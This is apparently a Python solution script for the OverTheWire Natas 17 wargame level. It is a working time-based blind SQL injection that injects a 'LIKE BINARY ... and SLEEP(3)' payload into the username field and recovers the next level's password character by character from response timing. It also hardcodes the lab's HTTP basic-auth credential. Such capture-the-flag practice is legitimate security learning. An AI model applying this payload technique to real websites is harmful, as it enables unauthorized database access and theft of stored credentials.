import requests
import time
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = "bcfgnopstwABDGNPRUXZ02346"
passwd = ""

# for char in chars:
#     print(f"Testing: {char}", end='\r')
#     start = time.time()
#     Data = {'username': 'natas18" and password LIKE BINARY "%' + char + '%" and SLEEP(3) #'}
#     req = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'), data=Data)
#     elapsed = time.time() - start

#     if elapsed > 2.5:
#         filtered = filtered + char
#         print(f"Filtered pass: {filtered}")
    

for i in range(0,32):
    for char in filtered:
        print(f"Testing: {char}", end='\r')
        start = time.time()
        Data = {'username': 'natas18" and password LIKE BINARY "' + passwd + char + '%" and SLEEP(3) #'}
        req = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'), data=Data)
        elapsed = time.time() - start

        if elapsed > 2.5:
            passwd = passwd + char
            print(f"Password: {passwd}")
            break
